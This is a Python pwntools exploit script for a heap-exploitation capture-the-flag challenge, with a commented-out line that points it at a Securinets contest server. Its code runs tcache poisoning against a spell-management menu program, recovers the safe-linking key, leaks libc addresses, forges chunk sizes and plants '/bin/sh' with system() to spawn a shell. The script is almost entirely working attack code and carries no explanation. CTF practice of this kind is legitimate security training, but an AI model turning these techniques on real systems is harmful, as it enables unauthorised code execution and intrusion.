#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './main')
libc = ELF(exe.libc.path)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def create(idx, name=b"\x00", effect=b"\x00", mana_cost=0, cooldown=0, element=0):
    io.sendlineafter(b": ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendafter(b"name: ", name)
    io.sendafter(b"effect: ", effect)
    io.sendlineafter(b"mana cost: ", str(mana_cost).encode())
    io.sendlineafter(b": ", str(cooldown).encode())
    io.sendlineafter(b": ", str(element).encode())

def edit(idx, name=b"\x00", effect=b"A"*64, mana_cost=0, cooldown=0, element=0):
    io.sendlineafter(b": ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendafter(b"name: ", name)
    io.sendafter(b"effect: ", effect)
    io.sendlineafter(b"mana cost: ", str(mana_cost).encode())
    io.sendlineafter(b": ", str(cooldown).encode())
    io.sendlineafter(b": ", str(element).encode())
 
def delete(idx):
    io.sendlineafter(b": ", b"4")
    io.sendlineafter(b": ", str(idx).encode())

gdbscript = '''
continue
'''.format(**locals())

io = start()
#io = remote("pwn-14caf623.p1.securinets.tn", 9091)

create(0, name=p64(0x0)*3 + p64(0x80))
create(1, name=p64(0x0)*3 + p64(0x80))

for i in range(2, 20): create(i)

delete(1)
delete(0)

io.sendlineafter(b": ", b"3")
io.recvuntil(b"ame: ")
addr = u64(io.recvline().strip().ljust(8, b'\x00'))
io.recvuntil(b"ame: ")
key = u64(io.recvline().strip().ljust(8, b'\x00'))


edit(0, name=p64(((addr^key)-96)^key))
create(2)

edit(2, name=p64(0x0)*3 + p64(0x80))
create(3)

edit(2, name=p64(0x0)*3 + p64(0x501))
edit(10, name=p64(0x0)*3 + p64(0x21))
delete(3)

io.sendlineafter(b": ", b"3")
io.interactive()
io.recvuntil(b"lot 3:")
io.recvuntil(b"ame: ")
libc.address = u64(b"\x20" + io.recvline().strip().ljust(7, b'\x00')) - 0x1e7b20
log.info(hex(libc.address))

edit(0, name=b"/bin/sh\x00".ljust(0x8, b"\x00") + p64(0)*2 + p64(libc.symbols["system"]), effect=p64(0x0)*8)
edit(1, name=p64(0) + p64(libc.address + 0x205700) + p64(0x0)*2, effect=p64((addr^key)-128-0x20) + p64(0x0)*3 + p64((addr^key)-128) + p64(0x0)*2 + p64(libc.address + 0x202228 + 0x30))


#delete(17)
#delete(16)

#edit(16, name=p64(libc.symbols['_IO_list_all']^(((addr^key) + 1920)>>12)))
#create(18)
#create(19)
#edit(19, name=p64((addr^key)-128))


io.interactive()

